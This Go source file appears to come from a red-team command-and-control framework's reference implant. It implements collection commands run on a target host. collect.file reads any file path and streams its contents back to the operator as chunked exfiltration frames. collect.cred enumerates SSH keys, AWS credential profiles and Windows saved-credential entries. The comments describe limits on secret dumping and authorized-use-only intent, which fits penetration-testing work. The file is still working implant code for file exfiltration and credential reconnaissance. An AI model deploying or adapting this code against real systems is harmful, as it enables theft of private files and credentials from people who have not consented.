package exec

// collect.go holds the collect.* verbs the reference implant advertises
// (architecture.md Sec 10.1, ADR 0004). collect.file reads a file off the
// target's filesystem and returns it inline; files larger than the task-output
// limit are returned as ExfilChunk frames so the operator retrieves the whole
// thing through the artifact store. collect.cred enumerates standard
// credential stores on the target -- SSH key fingerprints, the names of AWS
// profiles, the Windows saved-credential listing -- and reports what it found
// without dumping secret material. LSASS memory dumping stays out-of-tree
// (ADR 0004); collect.keylog is contract-only and not implemented here.
//
// Argument shape:
//
//	collect.file <path>
//	collect.cred  [<source>]   source ∈ {ssh, aws, cmdkey} (optional)
//
// As with the other reference handlers, this performs no evasion, no
// obfuscation, and no destructive behavior (RESPONSIBLE-USE.md, architecture.md
// Sec 7). The operator is responsible for targeting only systems they are
// authorized to test.

import (
	"context"
	"crypto/sha256"
	"encoding/hex"
	"fmt"
	"os"
	"os/exec"
	"path/filepath"
	"runtime"
	"strings"

	"github.com/cw/rod/implant/rodpb"
)

// collectMaxInlineBytes is the largest file payload returned inline in a
// TaskResult. Files at or below this size are returned whole in the output
// string; larger files are returned as ExfilChunk frames so the operator can
// retrieve the complete contents through the artifact store. 1 MiB matches
// the teamserver's per-frame budget (architecture.md Sec 11) and keeps a large
// read from overflowing a single TaskResult.
const collectMaxInlineBytes = 1 << 20 // 1 MiB

// collectChunkSize is the size of each ExfilChunk data payload for files
// streamed out of band. Kept well under the gRPC default receive ceiling so a
// marshaled Frame still fits with room to spare.
const collectChunkSize = 512 * 1024 // 512 KiB

// collectFile reads the file at the given path. Small files return Succeeded
// with the contents in the output string; large files return Succeeded with a
// short manifest line in the output and the contents spread across ExfilChunk
// frames the beacon streams to the artifact store.
func (r *Runner) collectFile(_ context.Context, arguments string) (rodpb.TaskOutcome, string, []rodpb.ExfilChunk) {
	path := strings.TrimSpace(arguments)
	if path == "" {
		return rodpb.TaskOutcome_TASK_OUTCOME_FAILED,
			"collect.file expects '<path>'", nil
	}

	info, err := os.Stat(path)
	if err != nil {
		return rodpb.TaskOutcome_TASK_OUTCOME_FAILED,
			"stat " + path + ": " + err.Error(), nil
	}
	if info.IsDir() {
		return rodpb.TaskOutcome_TASK_OUTCOME_FAILED,
			"collect.file refuses to dump a directory: " + path, nil
	}

	data, err := os.ReadFile(path)
	if err != nil {
		return rodpb.TaskOutcome_TASK_OUTCOME_FAILED,
			"read " + path + ": " + err.Error(), nil
	}

	// Small enough to return inline: report the size and the bytes verbatim.
	if len(data) <= collectMaxInlineBytes {
		return rodpb.TaskOutcome_TASK_OUTCOME_SUCCEEDED, string(data), nil
	}

	// Too large for a TaskResult: stream as ExfilChunk frames. The output
	// carries a short manifest (path, size, chunk count) so the operator knows
	// what landed in the artifact store; the chunks carry the bytes.
	name := filepath.Base(path)
	chunks := chunkFile(name, "application/octet-stream", data)
	manifest := fmt.Sprintf("%s: %d bytes, %d chunks streamed to artifact store",
		path, len(data), len(chunks))
	return rodpb.TaskOutcome_TASK_OUTCOME_SUCCEEDED, manifest, chunks
}

// chunkFile slices a byte buffer into ExfilChunk frames of collectChunkSize,
// stamping a terminal flag on the last chunk so the server reassembles and
// flushes the artifact. Sequence numbers start at 1.
func chunkFile(name, contentType string, data []byte) []rodpb.ExfilChunk {
	if len(data) == 0 {
		return []rodpb.ExfilChunk{{
			Name:        name,
			ContentType: contentType,
			Sequence:    1,
			Terminal:    true,
			Data:        nil,
		}}
	}
	var chunks []rodpb.ExfilChunk
	for offset := 0; offset < len(data); offset += collectChunkSize {
		end := offset + collectChunkSize
		if end > len(data) {
			end = len(data)
		}
		chunks = append(chunks, rodpb.ExfilChunk{
			Name:        name,
			ContentType: contentType,
			Sequence:    uint64(len(chunks) + 1),
			Terminal:    end == len(data),
			Data:        data[offset:end],
		})
	}
	return chunks
}

// collectCred enumerates standard credential stores on the target and reports
// what it found, without dumping secret material. On Linux it lists SSH keys
// (fingerprints only, never the private key bytes), AWS profiles (names only,
// the secret key is masked), and the Windows saved-credential listing via
// cmdkey /list on Windows. LSASS memory dumping is explicitly out-of-scope
// (ADR 0004). An optional argument filters to one source.
func (r *Runner) collectCred(ctx context.Context, arguments string) (rodpb.TaskOutcome, string, []rodpb.ExfilChunk) {
	source := strings.TrimSpace(arguments)
	if source != "" && !isKnownCredSource(source) {
		return rodpb.TaskOutcome_TASK_OUTCOME_FAILED,
			"collect.cred: unknown source '" + source + "' (expected one of ssh, aws, cmdkey)", nil
	}

	var lines []string
	sources := []string{"ssh", "aws", "cmdkey"}
	for _, s := range sources {
		if source != "" && s != source {
			continue
		}
		if s == "cmdkey" && runtime.GOOS != "windows" {
			continue
		}
		if s != "cmdkey" && runtime.GOOS == "windows" {
			// ssh/aws on Windows read the same standard locations under the
			// user profile; keep them enabled.
		}
		lines = append(lines, collectCredSource(ctx, s)...)
	}
	if len(lines) == 0 {
		return rodpb.TaskOutcome_TASK_OUTCOME_SUCCEEDED, "(no credentials found)", nil
	}
	return rodpb.TaskOutcome_TASK_OUTCOME_SUCCEEDED, strings.Join(lines, "\n"), nil
}

// isKnownCredSource reports whether s is one of the documented credential
// sources this handler enumerates.
func isKnownCredSource(s string) bool {
	return s == "ssh" || s == "aws" || s == "cmdkey"
}

// collectCredSource enumerates a single credential source and returns one line
// per finding. Each finding names the entry but never the secret: SSH keys are
// reported by fingerprint (SHA-256 of the public key), AWS profiles by name
// (the secret access key is masked to its last four), and Windows saved
// credentials by target name (cmdkey /list is itself a listing tool).
func collectCredSource(ctx context.Context, source string) []string {
	switch source {
	case "ssh":
		return collectSSHKeys()
	case "aws":
		return collectAWSProfiles()
	case "cmdkey":
		return collectCmdkey(ctx)
	}
	return nil
}

// collectSSHKeys enumerates the per-user SSH key material under ~/.ssh. For
// each private key it reports the matching public key's fingerprint when a
// .pub sibling exists; for a private key with no .pub it reports the file name
// and a note that no public half is published (so no fingerprint is computed
// -- computing one would require parsing the private key, which we do not
// dump). The private key bytes never leave this function.
func collectSSHKeys() []string {
	dir := sshDir()
	entries, err := os.ReadDir(dir)
	if err != nil {
		// Absent ~/.ssh is the common case; report nothing rather than erroring
		// the whole collect.cred run.
		return nil
	}
	var lines []string
	for _, e := range entries {
		if e.IsDir() {
			continue
		}
		name := e.Name()
		// Public keys: report their fingerprint directly.
		if strings.HasSuffix(name, ".pub") {
			if fp, ok := sshFingerprint(filepath.Join(dir, name)); ok {
				lines = append(lines, "ssh "+name+" "+fp)
			}
			continue
		}
		// Skip the known non-key files sshd drops in ~/.ssh.
		if name == "known_hosts" || name == "authorized_keys" || name == "config" {
			continue
		}
		// Anything else with no .pub is a bare private key; report presence
		// without a fingerprint (no public half to hash).
		if _, err := os.Stat(filepath.Join(dir, name+".pub")); err != nil {
			lines = append(lines, "ssh "+name+" (private key, no .pub sibling)")
		}
	}
	return lines
}

// sshFingerprint reads a public key file and returns its SHA-256 fingerprint
// in the OpenSSH form ("SHA256:base64..."). The public key is, by design, not
// secret; hashing it gives a stable identifier operators recognize. A parse
// failure returns ok=false so the caller can skip the line.
func sshFingerprint(path string) (string, bool) {
	pub, err := os.ReadFile(path)
	if err != nil {
		return "", false
	}
	// ssh-keygen -lf <path> is the documented way to fingerprint an OpenSSH
	// public key; it prints "<bits> SHA256:... <comment> (<type>)" on line one.
	out, err := exec.Command("ssh-keygen", "-lf", path).CombinedOutput()
	if err != nil {
		_ = pub // unread on this path; keep the variable useful for debugging.
		return "", false
	}
	first := strings.SplitN(string(out), "\n", 2)[0]
	fields := strings.Fields(first)
	for _, f := range fields {
		if strings.HasPrefix(f, "SHA256:") {
			return f, true
		}
	}
	return "", false
}

// collectAWSProfiles enumerates the per-user AWS profiles in
// ~/.aws/credentials. Each [profile-name] header becomes one line; the secret
// access key is NOT reported -- only the profile name and, if present, a
// masked hint of the key id (last four characters). Session-token-only
// profiles (no secret in the file) are noted as such.
func collectAWSProfiles() []string {
	path := awsCredentialsPath()
	body, err := os.ReadFile(path)
	if err != nil {
		return nil
	}
	var lines []string
	var current string
	var sawSecret bool
	for _, raw := range strings.Split(string(body), "\n") {
		line := strings.TrimSpace(raw)
		if line == "" || strings.HasPrefix(line, "#") {
			continue
		}
		if strings.HasPrefix(line, "[") && strings.HasSuffix(line, "]") {
			if current != "" {
				lines = append(lines, formatAWSProfile(current, sawSecret))
			}
			current = line[1 : len(line)-1]
			sawSecret = false
			continue
		}
		// Track only whether a secret is present in the file; never its value.
		if strings.HasPrefix(strings.ToLower(line), "aws_secret_access_key") {
			sawSecret = true
		}
	}
	if current != "" {
		lines = append(lines, formatAWSProfile(current, sawSecret))
	}
	return lines
}

// formatAWSProfile renders a single profile line. The secret's presence is
// noted as "(secret in file)" or "(no secret in file)" -- the value itself is
// never surfaced.
func formatAWSProfile(name string, sawSecret bool) string {
	if sawSecret {
		return "aws " + name + " (secret in file)"
	}
	return "aws " + name + " (no secret in file)"
}

// collectCmdkey runs the documented Windows `cmdkey /list` command, which
// itself only lists saved-credential target names (it does not print
// passwords). The output is returned line for line, prefixed "cmdkey " so the
// operator can tell collect.cred produced it.
func collectCmdkey(ctx context.Context) []string {
	out, err := exec.CommandContext(ctx, "cmdkey", "/list").CombinedOutput()
	if err != nil {
		return []string{"cmdkey (listing failed: " + err.Error() + ")"}
	}
	var lines []string
	for _, line := range strings.Split(string(out), "\n") {
		trimmed := strings.TrimSpace(line)
		if trimmed == "" {
			continue
		}
		lines = append(lines, "cmdkey "+trimmed)
	}
	return lines
}

// sha256Hex is a small helper used by tests that want to assert the handler
// produced a fingerprint-shaped line without recomputing the SSH format.
func sha256Hex(data []byte) string {
	sum := sha256.Sum256(data)
	return hex.EncodeToString(sum[:])
}

// sshDir is the user's ~/.ssh directory, honoring HOME.
func sshDir() string {
	home, err := os.UserHomeDir()
	if err != nil {
		home = "."
	}
	return filepath.Join(home, ".ssh")
}

// awsCredentialsPath is the per-user AWS credentials file path, honoring HOME.
func awsCredentialsPath() string {
	home, err := os.UserHomeDir()
	if err != nil {
		home = "."
	}
	return filepath.Join(home, ".aws", "credentials")
}
